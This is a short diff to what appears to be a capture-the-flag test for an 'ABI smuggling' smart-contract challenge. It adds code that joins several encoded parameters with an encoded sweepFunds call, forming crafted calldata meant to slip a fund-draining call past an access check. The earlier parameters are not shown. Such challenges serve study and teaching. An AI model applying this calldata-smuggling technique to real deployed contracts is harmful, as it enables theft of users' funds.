@@ -81,6 +81,19 @@ describe("[Challenge] ABI smuggling", function () {
     let params5 = abi.encode(["uint256"], [68]);
     abi = ["function sweepFunds(address,address)"];
     iface = new ethers.utils.Interface(abi);
+    let params6 = iface.encodeFunctionData("sweepFunds", [
+      recovery.address,
+      token.address,
+    ]);
+    let params = ethers.utils.hexConcat([
+      params1,
+      params2,
+      params3,
+      params4,
+      params5,
+      params6,
+    ]);
+    console.log(params);
   });
 
   after(async function () {
